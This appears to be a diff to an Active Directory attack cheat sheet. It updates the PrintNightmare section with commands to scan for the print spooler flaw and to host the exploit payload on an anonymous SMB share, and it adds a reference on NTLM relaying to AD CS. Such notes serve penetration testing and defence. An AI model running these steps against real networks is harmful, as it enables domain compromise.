@@ -601,19 +601,20 @@ Requirements:
 **Detect the vulnerability**:
 * Impacket - [rpcdump](https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/rpcdump.py)
   ```ps1
-  python3 ./rpcdump.py @10.0.2.10 | grep MS-RPRN
+  python3 ./rpcdump.py @10.0.2.10 | egrep 'MS-RPRN|MS-PAR'
   Protocol: [MS-RPRN]: Print System Remote Protocol
   ```
 * [It Was All A Dream](https://github.com/byt3bl33d3r/ItWasAllADream) 
   ```ps1
   git clone https://github.com/byt3bl33d3r/ItWasAllADream
   cd ItWasAllADream && poetry install && poetry shell
-  itwasalladream -u user -p password -d domain 192.168.1.0/24
+  itwasalladream -u user -p Password123 -d domain 10.10.10.10/24
+  docker run -it itwasalladream -u username -p Password123 -d domain 10.10.10.10
   ```
 
 **Trigger the exploit**: 
 
-**NOTE**: The payload can be hosted on Impacket SMB server since [PR #1109](https://github.com/SecureAuthCorp/impacket/pull/1109): `python3 ./smbserver.py share /tmp/smb/`
+**NOTE**: The payload can be hosted on Impacket SMB server since [PR #1109](https://github.com/SecureAuthCorp/impacket/pull/1109): `python3 ./smbserver.py share /tmp/smb/` or using [Invoke-BuildAnonymousSMBServer](https://github.com/3gstudent/Invoke-BuildAnonymousSMBServer/blob/main/Invoke-BuildAnonymousSMBServer.ps1) : `Import-Module .\Invoke-BuildAnonymousSMBServer.ps1; Invoke-BuildAnonymousSMBServer -Path C:\Share -Mode Enable`
 
 * [SharpNightmare](https://github.com/cube0x0/CVE-2021-1675)
   ```powershell
@@ -2874,3 +2875,4 @@ CME          10.XXX.XXX.XXX:445 HOSTNAME-01   [+] DOMAIN\COMPUTER$ 31d6cfe0d16ae
 * [Attacking Active Directory: 0 to 0.9 - Eloy Pérez González - 2021/05/29](https://zer1t0.gitlab.io/posts/attacking_ad/)
 * [Microsoft ADCS – Abusing PKI in Active Directory Environment - Jean MARSAULT - 14/06/2021](https://www.riskinsight-wavestone.com/en/2021/06/microsoft-adcs-abusing-pki-in-active-directory-environment/)
 * [Certified Pre-Owned - Will Schroeder and Lee Christensen - June 17, 2021](http://www.harmj0y.net/blog/activedirectory/certified-pre-owned/)
+* [NTLM relaying to AD CS - On certificates, printers and a little hippo - Dirk-jan Mollema](https://dirkjanm.io/ntlm-relaying-to-ad-certificate-services/)
